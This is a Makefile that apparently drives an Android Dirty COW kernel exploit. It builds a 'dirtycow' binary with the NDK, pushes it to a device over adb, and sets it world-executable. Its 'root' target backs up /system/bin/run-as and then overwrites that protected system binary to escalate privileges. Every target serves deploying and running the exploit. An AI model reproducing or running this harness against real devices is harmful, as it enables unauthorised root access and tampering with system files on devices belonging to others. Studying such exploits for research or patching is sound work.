
ARCH := armeabi-v7a
SDK_VERSION := 15

all: build

build: clean
	/home/edllt/android_stuff/toolchains/android-ndk-r11c/ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

push: build
	adb -t 1 push libs/$(ARCH)/dirtycow /data/local/tmp/Testing/dirtycow
	adb -t 1 shell 'chmod 777 /data/local/tmp/Testing/dirtycow'

test: push
	adb -t 1 shell '/data/local/tmp/Testing/dirtycow /data/local/tmp/lorem.txt /system/bin/run-as'

root: push
	adb -t 1 shell 'chmod 777 /data/local/tmp/Testing/dirtycow'
	adb -t 1 push libs/$(ARCH)/run-as /data/local/tmp/Testing/run-as
	adb -t 1 shell 'cat /system/bin/run-as > /data/local/tmp/Testing/run-as-original'
	adb -t 1 shell '/data/local/tmp/Testing/dirtycow  /system/bin/run-as'

clean:
	rm -rf libs
	rm -rf obj

